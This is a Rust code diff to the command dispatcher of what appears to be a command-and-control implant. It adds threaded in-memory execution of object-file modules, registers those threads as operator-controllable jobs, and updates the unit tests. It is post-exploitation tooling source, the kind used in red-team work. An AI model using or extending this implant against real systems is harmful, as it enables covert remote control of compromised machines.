@@ -34,6 +34,8 @@ use crate::dotnet;
 use crate::download::{
     DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState, DownloadTracker,
 };
+#[cfg(windows)]
+use crate::job::JOB_TYPE_THREAD;
 use crate::job::JobStore;
 use crate::token::TokenVault;
 
@@ -166,7 +168,7 @@ pub fn dispatch(
         DemonCommand::CommandKerberos => handle_kerberos(&package.payload),
         DemonCommand::CommandConfig => handle_config(&package.payload, config),
         DemonCommand::CommandInlineExecute => {
-            handle_inline_execute(&package.payload, config, mem_files)
+            handle_inline_execute(&package.payload, config, mem_files, job_store)
         }
         DemonCommand::CommandJob => handle_job(&package.payload, job_store),
         DemonCommand::CommandPsImport => handle_ps_import(&package.payload, ps_scripts, mem_files),
@@ -3574,7 +3576,12 @@ fn handle_inline_execute(
     payload: &[u8],
     config: &SpecterConfig,
     mem_files: &mut MemFileStore,
+    job_store: &mut JobStore,
 ) -> DispatchResult {
+    // job_store is only consumed on Windows inside the #[cfg(windows)] block.
+    #[cfg(not(windows))]
+    let _ = &*job_store;
+
     let mut offset = 0;
 
     // Parse function name (length-prefixed UTF-8 string)
@@ -3655,7 +3662,33 @@ fn handle_inline_execute(
         "InlineExecute: executing BOF"
     );
 
-    // Execute the BOF
+    // On Windows, attempt to run the BOF in a background thread when requested.
+    // If the thread spawns successfully, register it in the job store so the
+    // operator can suspend/resume/kill it via CommandJob, then return without
+    // waiting for the BOF to finish.  On failure (or on non-Windows), fall
+    // through to synchronous execution.
+    #[cfg(windows)]
+    if threaded {
+        match coffeeldr::coffee_execute_threaded(
+            function_name.clone(),
+            bof_data.clone(),
+            arg_data.clone(),
+        ) {
+            Some(handle) => {
+                let job_id = job_store.add(JOB_TYPE_THREAD, handle);
+                info!(job_id, function = %function_name, "BOF thread started and registered");
+                mem_files.remove(&bof_file_id);
+                mem_files.remove(&params_file_id);
+                // No immediate response — output arrives asynchronously from the thread.
+                return DispatchResult::Ignore;
+            }
+            None => {
+                warn!("InlineExecute: CreateThread failed — falling back to sync execution");
+            }
+        }
+    }
+
+    // Execute the BOF synchronously (non-Windows, or when threaded spawn failed).
     let result = coffeeldr::coffee_execute(&function_name, &bof_data, &arg_data, threaded);
 
     // Clean up memfiles
@@ -7386,7 +7419,12 @@ mod tests {
 
     #[test]
     fn inline_execute_short_payload_returns_could_not_run() {
-        let result = handle_inline_execute(&[], &SpecterConfig::default(), &mut HashMap::new());
+        let result = handle_inline_execute(
+            &[],
+            &SpecterConfig::default(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+        );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
         };
@@ -7411,8 +7449,12 @@ mod tests {
         // flags
         payload.extend_from_slice(&0u32.to_le_bytes());
 
-        let result =
-            handle_inline_execute(&payload, &SpecterConfig::default(), &mut HashMap::new());
+        let result = handle_inline_execute(
+            &payload,
+            &SpecterConfig::default(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+        );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
         };
@@ -7435,7 +7477,12 @@ mod tests {
         payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id
         payload.extend_from_slice(&0u32.to_le_bytes()); // flags
 
-        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
+        let result = handle_inline_execute(
+            &payload,
+            &SpecterConfig::default(),
+            &mut mem_files,
+            &mut JobStore::new(),
+        );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
         };
@@ -7460,7 +7507,12 @@ mod tests {
         payload.extend_from_slice(&2u32.to_le_bytes());
         payload.extend_from_slice(&0u32.to_le_bytes());
 
-        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
+        let result = handle_inline_execute(
+            &payload,
+            &SpecterConfig::default(),
+            &mut mem_files,
+            &mut JobStore::new(),
+        );
         // Should get some kind of response (BOF_COULD_NOT_RUN on invalid COFF)
         match result {
             DispatchResult::Respond(resp) => {
@@ -8639,6 +8691,135 @@ mod tests {
         );
         // Short payload → returns CouldNotRun response.
         assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    /// Build a minimal InlineExecute payload with the given `flags` value.
+    ///
+    /// Does NOT insert a BOF memfile — the handler will return CouldNotRun
+    /// when the memfile is missing.  Used to test error-path behaviour.
+    fn inline_execute_payload_no_memfile(flags: i32) -> Vec<u8> {
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&1u32.to_le_bytes()); // bof_file_id = 1 (absent)
+        payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id = 2
+        payload.extend_from_slice(&flags.to_le_bytes());
+        payload
+    }
+
+    /// Insert a complete BOF memfile into `mem_files` by dispatching a
+    /// `CommandMemFile` packet.
+    fn insert_complete_memfile(mem_files: &mut MemFileStore, file_id: u32, data: Vec<u8>) {
+        let mut config = SpecterConfig::default();
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&file_id.to_le_bytes());
+        payload.extend_from_slice(&(data.len() as u64).to_le_bytes());
+        payload.extend_from_slice(&(data.len() as u32).to_le_bytes());
+        payload.extend_from_slice(&data);
+        let pkg = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
+        let _ = dispatch(
+            &pkg,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+    }
+
+    #[test]
+    fn inline_execute_threaded_missing_bof_returns_could_not_run() {
+        // When the BOF memfile is absent, threaded mode still returns an error
+        // and registers no job in the store.
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+        let mut job_store = JobStore::new();
+
+        let package = DemonPackage::new(
+            DemonCommand::CommandInlineExecute,
+            1,
+            inline_execute_payload_no_memfile(1), // flags=1 → threaded
+        );
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut job_store,
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+        assert_eq!(job_store.list().count(), 0, "no job should be registered on error");
+    }
+
+    #[test]
+    fn inline_execute_nonthreaded_does_not_register_job() {
+        // flags=0 (sync) with a garbage BOF: runs sync, returns BOF_COULD_NOT_RUN,
+        // and leaves the job store empty.
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+        let mut job_store = JobStore::new();
+
+        insert_complete_memfile(&mut mem_files, 10, vec![0xDE, 0xAD]); // garbage COFF
+
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&10u32.to_le_bytes()); // bof_file_id = 10
+        payload.extend_from_slice(&11u32.to_le_bytes()); // params_file_id = 11 (absent → empty)
+        payload.extend_from_slice(&0i32.to_le_bytes()); // flags = 0 → non-threaded
+
+        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut job_store,
+            &mut Vec::new(),
+        );
+        assert!(matches!(result, DispatchResult::Respond(_)));
+        assert_eq!(job_store.list().count(), 0, "sync BOF must not register a job");
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    fn inline_execute_threaded_non_windows_falls_back_to_sync() {
+        // On non-Windows the threaded path is a no-op stub; execution falls
+        // back to sync, returns BOF_COULD_NOT_RUN, and no job is registered.
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+        let mut job_store = JobStore::new();
+
+        insert_complete_memfile(&mut mem_files, 20, vec![0xDE, 0xAD]); // garbage COFF
+
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&20u32.to_le_bytes()); // bof_file_id = 20
+        payload.extend_from_slice(&21u32.to_le_bytes()); // params_file_id = 21 (absent → empty)
+        payload.extend_from_slice(&1i32.to_le_bytes()); // flags = 1 → threaded
+
+        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut job_store,
+            &mut Vec::new(),
+        );
+        // Non-Windows sync fallback → returns BOF_COULD_NOT_RUN response
+        assert!(matches!(result, DispatchResult::Respond(_)));
+        // No job registered — threaded BOF unsupported on non-Windows
+        assert_eq!(job_store.list().count(), 0);
     }
 
     #[test]
